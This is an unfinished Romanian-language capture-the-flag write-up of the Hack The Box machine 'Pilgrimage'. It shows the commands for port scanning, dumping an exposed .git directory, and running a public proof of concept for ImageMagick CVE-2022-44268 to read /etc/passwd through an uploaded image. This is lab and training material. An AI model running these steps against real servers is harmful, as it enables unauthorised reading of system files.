1. Scanam masina cu [[Tools/nmap]] ca sa vedem care porturi sunt deschise.
```bash
sudo nmap -sSCV -T 4 10.10.11.219 -oN nmap_sSCV_scan
```
![[Pasted image 20231121140454.png]]
2. Adaugam [[IP]] adresa in `/etc/hosts`.
![[Pasted image 20231121140752.png]]
3. Deschidem pagina web pe portul 80 care este si un [[http request smuggling]]
![[Pasted image 20231121140903.png]]
4. Putem incarca imagine acesta poate sa fii un vector de atack dar trebuie sa enumeram paginele ascunse
```bash
dirseach -u http://pilgrimage.htb/
```
![[Pasted image 20231121141551.png]]
5. Putem vedea directoriul `.git`.
6. Putem face dump la acest directoriu ca sa vedem ce este.
Install [here](https://github.com/arthaud/git-dumper/blob/master/README.md) [[git-dumper]] este o utilita nou in setul meu =(
```bash
python3 git-dumper.py <URL> <DIR>
```
7. Vedem ce am primit in `<DIR>` ?
![[Pasted image 20231122131736.png]]
Avem fisierele `.php` si un fisier `magick` care si este vulnerabil in cazul nostru
![[Pasted image 20231122131924.png]]
Versiunea este `7.1.0-49`
8. Pe [google](https://www.google.com/search?q=ImageMagick+7.1.0-49+vuln+POC&sca_esv=584551767&sxsrf=AM9HkKkScmVLx2ptqvv9MCbY5BXBxIDhPA%3A1700652051402&source=hp&ei=E-RdZby_Fef_7_UPkNShgAY&iflsig=AO6bgOgAAAAAZV3yI9aDc7HjSLFnLOZWVGs9cxQxPx92&ved=0ahUKEwj8lKHLvteCAxXn_7sIHRBqCGAQ4dUDCAk&uact=5&oq=ImageMagick+7.1.0-49+vuln+POC&gs_lp=Egdnd3Mtd2l6Ih1JbWFnZU1hZ2ljayA3LjEuMC00OSB2dWxuIFBPQzIHECMY6gIYJzIHECMY6gIYJzIHECMY6gIYJzIHECMY6gIYJzIHECMY6gIYJzIHECMY6gIYJzIHECMY6gIYJzIHECMY6gIYJzIHECMY6gIYJzIHECMY6gIYJzIWEAAYAxiPARjlAhjqAhi0AhiMA9gBATIWEAAYAxiPARjlAhjqAhi0AhiMA9gBATIWEAAYAxiPARjlAhjqAhi0AhiMA9gBATIWEC4YAxiPARjlAhjqAhi0AhiMA9gBATIWEAAYAxiPARjlAhjqAhi0AhiMA9gBATIWEAAYAxiPARjlAhjqAhi0AhiMA9gBATIWEAAYAxiPARjlAhjqAhi0AhiMA9gBATIWEAAYAxiPARjlAhjqAhi0AhiMA9gBATIWEAAYAxiPARjlAhjqAhi0AhiMA9gBATIWEC4YAxiPARjlAhjqAhi0AhiMA9gBAUjQLVCjCFjXK3ABeACQAQCYAQCgAQCqAQC4AQPIAQD4AQL4AQGoAhS6BgYIARABGAs&sclient=gws-wiz) facem o cautare si gasim [POC](https://github.com/entr0pie/CVE-2022-44268)
9. Instalam utilita si o lansam
```bash
convert run '/etc/passwd'
```
In rezultat primim un fisier `.png` care poate sa citeasca fisierul care lam specificat `/etc/passed`. Trebuie de mentionat ca utilita [[cargo]] la fel este nou pentru arsenalul meu
![[Pasted image 20231122132733.png]]
10. Incarcam imaginea data pe site si o downladam.
![[Pasted image 20231122133019.png]]
Acum vedem cu [[identify]]' abatere mica utilita nou KEK' ce se ascunde in imaginea data.
```bash
identify -verbose 655de61f7dafb.png
```
Avem un hex:
![[Pasted image 20231122133241.png]]
11. Cu [[python]] convertim in [[ASCII]] si putem vedea ce este 
```python3
bytes.fromhex('hex')
```
![[Pasted image 20231122133641.png]]
Casa fie mai usor de citit folosim
```bash
echo -e <inputul> >> passwd_Pilgrimage.txt
```
![[Pasted image 20231122133853.png]]
10. Ne returnam in urma si deschidem fisierele `.php`
![[Pasted image 20231123105522.png]]
Putem vedea baza de date sa incercam so citim 
## To be continue

